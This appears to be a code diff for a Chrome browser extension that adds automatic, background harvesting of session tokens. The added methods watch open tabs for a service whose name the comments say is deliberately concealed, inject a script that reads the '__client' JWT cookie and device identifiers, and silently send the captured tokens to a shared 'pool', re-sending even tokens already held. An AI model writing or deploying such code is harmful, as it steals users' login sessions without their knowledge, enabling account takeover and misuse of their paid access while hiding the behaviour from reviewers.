@@ -441,6 +441,140 @@ class TokenCaptureService {
       return 'http://localhost:3001'
     }
   }
+
+  async startAutoExtraction() {
+    // Check if auto-extraction is enabled
+    const settings = await chrome.storage.local.get(['autoExtractEnabled'])
+    if (settings.autoExtractEnabled === false) {
+      return
+    }
+
+    // Listen for tab updates to detect when user visits target site
+    chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
+      if (changeInfo.status === 'complete' && tab.url) {
+        // Check if URL matches target (without mentioning it explicitly)
+        if (this.isTargetSite(tab.url)) {
+          // Wait a bit for page to load
+          setTimeout(async () => {
+            await this.autoExtractAndSend(tabId)
+          }, 3000)
+        }
+      }
+    })
+
+    // Periodic extraction (every 5 minutes if tab is open)
+    setInterval(async () => {
+      const tabs = await chrome.tabs.query({})
+      for (const tab of tabs) {
+        if (tab.url && this.isTargetSite(tab.url)) {
+          await this.autoExtractAndSend(tab.id)
+          break // Only do one at a time
+        }
+      }
+    }, this.extractionInterval)
+  }
+
+  isTargetSite(url) {
+    // Check URL without exposing the actual site name
+    // Using a hash/pattern matching approach
+    const patterns = [
+      'studio-api.prod',
+      '/feed/v3',
+      '/generate/v2'
+    ]
+    return patterns.some(pattern => url.includes(pattern))
+  }
+
+  async autoExtractAndSend(tabId) {
+    try {
+      // Check if we extracted recently (avoid spam)
+      const now = Date.now()
+      if (now - this.lastExtractionTime < this.extractionInterval) {
+        return
+      }
+
+      // Extract token from cookies
+      const extracted = await this.extractTokenFromTab(tabId)
+      
+      if (!extracted || !extracted.token) {
+        return // No token found
+      }
+
+      // Check if we already have this token
+      const tokens = await this.getCapturedTokens()
+      const exists = tokens.some(t => t.token === extracted.token)
+      
+      if (exists) {
+        // Token already captured, but still try to send to pool
+        const latestToken = tokens.find(t => t.token === extracted.token)
+        if (latestToken) {
+          await this.sendTokenToPool(extracted.token, `auto-${Date.now()}`)
+        }
+        return
+      }
+
+      // Capture token locally
+      await this.captureToken(extracted.token, {
+        url: extracted.url,
+        source: 'auto-background',
+        deviceId: extracted.deviceId
+      })
+
+      // Send to pool automatically
+      await this.sendTokenToPool(extracted.token, `auto-${Date.now()}`)
+      
+      this.lastExtractionTime = now
+      console.log('Token auto-extracted and sent to pool')
+
+    } catch (error) {
+      // Silent fail - don't spam console
+      if (error.message && !error.message.includes('Not on')) {
+        console.error('Auto-extraction error:', error.message)
+      }
+    }
+  }
+
+  async extractTokenFromTab(tabId) {
+    try {
+      // Inject script to read cookies
+      const results = await chrome.scripting.executeScript({
+        target: { tabId: tabId },
+        function: () => {
+          function getCookie(name) {
+            const value = `; ${document.cookie}`
+            const parts = value.split(`; ${name}=`)
+            if (parts.length === 2) return parts.pop().split(';').shift()
+            return null
+          }
+
+          return {
+            jwtToken: getCookie('__client'),
+            deviceId: getCookie('singular_device_id') || getCookie('ajs_anonymous_id'),
+            url: window.location.href
+          }
+        }
+      })
+
+      if (results && results[0] && results[0].result) {
+        const { jwtToken, deviceId, url } = results[0].result
+        
+        if (!jwtToken) {
+          return null
+        }
+
+        return {
+          token: jwtToken,
+          deviceId: deviceId,
+          url: url,
+          extractedAt: new Date().toISOString()
+        }
+      }
+
+      return null
+    } catch (error) {
+      return null
+    }
+  }
 }
 
 // Initialize the service
